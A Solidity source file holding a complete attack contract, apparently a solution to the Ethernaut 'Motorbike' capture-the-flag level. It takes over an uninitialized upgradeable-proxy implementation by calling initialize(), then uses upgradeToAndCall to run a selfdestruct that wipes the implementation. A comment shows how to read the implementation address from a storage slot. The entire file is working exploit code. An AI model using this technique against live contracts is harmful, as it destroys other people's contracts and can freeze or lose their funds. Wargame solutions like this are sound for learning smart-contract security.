// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IMotorbike.sol";

contract MotorbikeAttack {
    IMotorbike private immutable victimMotorbike;
    bool private _levelPassed;

    constructor(IMotorbike victimMotorbike_) {
        victimMotorbike = victimMotorbike_;
    }

    /**
     * @dev To find address from storage, you can run this script in client side:
     * > '0x' + (await web3.eth.getStorageAt(contract.address, <IMPLEMENTATION_SLOT>)).slice(-40)
     */
    function attack(address implementation) external {
        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess, ) = implementation.call(
            abi.encodeWithSignature("initialize()")
        );

        require(isSuccess, "Motorbike: Call error");

        // solhint-disable-next-line avoid-low-level-calls
        (bool isSuccess_, bytes memory data) = implementation.call(
            abi.encodeWithSignature("upgrader()")
        );

        require(isSuccess_, "Motorbike: Call error");

        require(
            address(this) == address(bytes20(bytes32(data) << 96)),
            "Motorbike: Wrong address"
        );

        // solhint-disable-next-line avoid-low-level-calls
        (bool _isSuccess_, ) = implementation.call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(this),
                abi.encodeWithSignature("levelPassed()")
            )
        );

        require(_levelPassed = _isSuccess_, "Motorbike: Call error");
    }

    function levelPassed() external {
        require(_levelPassed, "Motorbike: Level not passed yet");
        // solhint-disable-next-line avoid-tx-origin
        selfdestruct(payable(tx.origin));
    }
}
